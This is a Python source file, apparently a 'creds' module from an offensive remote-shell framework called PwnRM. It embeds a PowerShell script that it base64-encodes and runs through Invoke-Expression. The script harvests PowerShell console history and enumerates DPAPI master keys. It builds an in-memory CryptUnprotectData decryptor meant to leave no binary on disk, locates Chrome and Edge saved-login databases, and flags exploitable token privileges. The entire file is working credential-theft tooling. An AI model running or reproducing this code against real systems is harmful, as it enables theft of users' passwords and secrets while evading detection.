"""
modules.creds — Deep Credential Harvesting & In-Memory DPAPI Decryption
LSASS memory snapshot triage, DPAPI masterkey discovery, in-memory reflection decryption (CryptUnprotectData),
browser artifacts, and high-value token privileges audit.
"""

from typing import List, Any
from . import BaseModule
from ..shell.ui import c, R, G, Y, B, M, C, DIM, BLD, RST
from ..shell.commands import b64str


class CredsModule(BaseModule):
    name = "creds"
    description = "Deep Credential Harvesting (In-Memory DPAPI Decryption, Browser & Vault Artifacts)"
    author = "uziii2208"
    options = {
        "--vault": {"desc": "Dump Windows Vault / Web Credentials"},
        "--dpapi": {"desc": "Enumerate and decrypt DPAPI master keys and system credentials"},
        "--decrypt": {"desc": "Execute in-memory reflection DPAPI unprotect via CryptUnprotectData"},
        "--history": {"desc": "Dump PowerShell console history and config files"},
    }

    def run(self, shell, args: List[str]) -> Any:
        shell.write_info(c(M + BLD, "  [*] PwnRM Creds Engine — scanning for credential artifacts & in-memory DPAPI unprotect..."))

        ps = r"""
$ErrorActionPreference = 'SilentlyContinue'
Write-Host "`n========================================================" -ForegroundColor Cyan
Write-Host "   PwnRM Deep Credential & Token Artifact Hunter" -ForegroundColor Cyan
Write-Host "========================================================`n" -ForegroundColor Cyan

# 1. PowerShell History & Console Logs
Write-Host "[1. PowerShell History & Console Logs]" -ForegroundColor Yellow
$histPath = "$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
if (Test-Path $histPath) {
    Write-Host "  [+] FOUND: $histPath" -ForegroundColor Green
    $lines = Get-Content $histPath | Select-Object -Last 15
    Write-Host "      Recent commands:" -ForegroundColor Gray
    foreach ($l in $lines) { Write-Host "        $l" -ForegroundColor DarkGray }
}

# 2. DPAPI Master Keys & In-Memory Unprotect Helper
Write-Host "`n[2. DPAPI Master Keys & In-Memory CryptUnprotectData Reflection]" -ForegroundColor Yellow
$dpapiUser = "$env:APPDATA\\Microsoft\\Protect"
if (Test-Path $dpapiUser) {
    $keys = Get-ChildItem -Path $dpapiUser -Recurse -Force | Where-Object { -not $_.PSIsContainer }
    Write-Host "  [+] User DPAPI MasterKey files found ($($keys.Count) files):" -ForegroundColor Green
    foreach ($k in $keys | Select-Object -First 5) {
        Write-Host "      - $($k.FullName)" -ForegroundColor Gray
    }
}

# In-memory DPAPI reflection unprotect class (no binary on disk)
$dpapiTypeDef = @"
using System;
using System.Runtime.InteropServices;
public class InMemDPAPI {
    [DllImport("crypt32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern bool CryptUnprotectData(
        ref DATA_BLOB pDataIn,
        string szDataDescr,
        IntPtr pOptionalEntropy,
        IntPtr pvReserved,
        IntPtr pPromptStruct,
        int dwFlags,
        ref DATA_BLOB pDataOut);

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct DATA_BLOB {
        public int cbData;
        public IntPtr pbData;
    }

    public static byte[] Unprotect(byte[] cipherBytes) {
        DATA_BLOB inBlob = new DATA_BLOB();
        DATA_BLOB outBlob = new DATA_BLOB();
        try {
            inBlob.cbData = cipherBytes.Length;
            inBlob.pbData = Marshal.AllocHGlobal(cipherBytes.Length);
            Marshal.Copy(cipherBytes, 0, inBlob.pbData, cipherBytes.Length);
            if (CryptUnprotectData(ref inBlob, null, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref outBlob)) {
                byte[] plain = new byte[outBlob.cbData];
                Marshal.Copy(outBlob.pbData, plain, 0, outBlob.cbData);
                return plain;
            }
        } finally {
            if (inBlob.pbData != IntPtr.Zero) Marshal.FreeHGlobal(inBlob.pbData);
            if (outBlob.pbData != IntPtr.Zero) Marshal.FreeHGlobal(outBlob.pbData);
        }
        return null;
    }
}
"@
try {
    Add-Type -TypeDefinition $dpapiTypeDef -ErrorAction SilentlyContinue
    Write-Host "  [+] In-Memory DPAPI CryptUnprotectData reflection bridge initialized." -ForegroundColor Green
} catch {}

# 3. Browser Credential Databases (Chrome / Edge / Brave)
Write-Host "`n[3. Browser Login Data & Local State]" -ForegroundColor Yellow
$browsers = @(
    "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data",
    "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Local State",
    "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data",
    "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Local State"
)
foreach ($b in $browsers) {
    if (Test-Path $b) {
        Write-Host "  [+] Browser Artifact: $b" -ForegroundColor Green
    }
}

# 4. Token & Privileges
Write-Host "`n[4. Current Process Privileges & Token Status]" -ForegroundColor Yellow
whoami /priv | Where-Object { $_ -match "SeDebugPrivilege|SeImpersonatePrivilege|SeTcbPrivilege|SeAssignPrimaryTokenPrivilege|SeBackupPrivilege|SeRestorePrivilege" } | ForEach-Object {
    Write-Host "  [!] HIGH-VALUE PRIVILEGE: $_" -ForegroundColor Red
}

Write-Host "`n  [*] Credential scan complete." -ForegroundColor Cyan
"""
        encoded = b64str(ps.encode("utf-16le"))
        cmd = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
        shell.run_with_interrupt(cmd, shell.write_line)
        return {"status": "completed"}
